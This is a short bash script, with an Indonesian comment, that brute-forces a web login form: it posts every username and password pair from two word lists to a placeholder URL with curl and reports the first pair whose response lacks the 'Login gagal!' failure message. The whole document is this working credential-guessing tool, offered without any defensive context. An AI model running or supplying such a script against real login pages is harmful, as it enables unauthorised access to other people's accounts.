#!/bin/bash

url="http://??????"
success_indicator="Login gagal!"  # Kalau responsenya TIDAK mengandung ini = login berhasil

while IFS= read -r user; do
  while IFS= read -r pass; do
    echo "[*] Trying $user : $pass"
    response=$(curl -s -X POST -d "username=$user&password=$pass" "$url")
    
    if ! echo "$response" | grep -q "$success_indicator"; then
      echo "[+] LOGIN SUCCESS: $user:$pass"
      echo "$response" | head -n 10
      exit 0
    fi
  done < pass.txt
done < user.txt

echo "[-] No valid credentials found."
